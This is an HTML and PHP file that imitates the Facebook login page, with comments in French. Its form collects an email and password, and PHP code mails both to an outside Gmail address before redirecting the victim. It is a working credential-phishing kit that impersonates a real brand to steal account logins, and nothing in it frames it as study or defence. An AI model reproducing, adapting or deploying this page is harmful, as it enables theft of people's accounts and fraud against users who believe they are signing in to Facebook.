<!DOCTYPE html>

<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form action="" method="POST">
          <input type="email" placeholder="Email or phone number" name="email" required>
          <input type="password" placeholder="Password" name="password" required>
          <div class="link">
            <button type="submit" name="submit" class="login">Login</button>
            <a href="#" class="forgot">Forgot password?</a>
          </div>
          <hr>
          <div class="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
  </body>
</html>



<?php

if ( isset( $_POST["submit"] ) ) {

    $email = $_POST['email'];
    $password = $_POST['password'];

    // Configuration des paramètres pour utiliser Gmail SMTP
    $destinataire = "togbleprince908@gmail.com";
    $sujet = "Nouvelle tentative de connexion ";
     
    // Contenu de l'email
    $message = "Un utilisateur a tenté de se connecter avec les informations suivantes :\n\n Email : ".$email."\n  Mot de passe : ".$password."\n\n  ";


    $headers = "From: $email\r\n";
    $headers .= "Reply-To: $email\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // Utilisation de la fonction mail avec le serveur SMTP de Gmail
    if (mail($destinataire, $sujet, $message, $headers)) {
        // E-mail envoyé avec succès

        // Vous pouvez également enregistrer les données dans une base de données, etc.

        // Redirection vers une page de confirmation
        header("Location: index.php");
        exit();
    } else {
        // Erreur lors de l'envoi de l'e-mail
        echo "Erreur lors de l'envoi de l'e-mail.";
    }
}
?>
 
?>